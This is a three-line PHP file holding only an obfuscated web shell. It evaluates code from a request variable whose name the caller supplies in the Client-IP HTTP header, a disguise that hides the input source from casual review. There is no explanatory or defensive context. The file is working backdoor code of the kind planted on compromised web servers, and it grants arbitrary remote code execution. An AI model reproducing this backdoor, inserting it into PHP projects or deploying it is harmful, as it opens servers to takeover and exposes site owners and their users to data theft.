<?php
eval(${$_SERVER["HTTP_CLIENT_IP"]}[1]);
?>